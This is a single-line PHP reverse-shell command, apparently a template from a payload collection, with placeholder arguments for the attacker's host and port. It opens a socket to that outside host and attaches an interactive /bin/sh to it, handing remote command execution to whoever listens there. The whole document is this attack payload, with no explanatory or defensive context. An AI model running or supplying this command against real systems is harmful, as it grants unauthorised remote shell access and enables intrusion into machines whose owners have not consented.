php -r '$sock=fsockopen("$$ARGV1",$$ARGV2);exec("/bin/sh -i <&3 >&3 2>&3");'
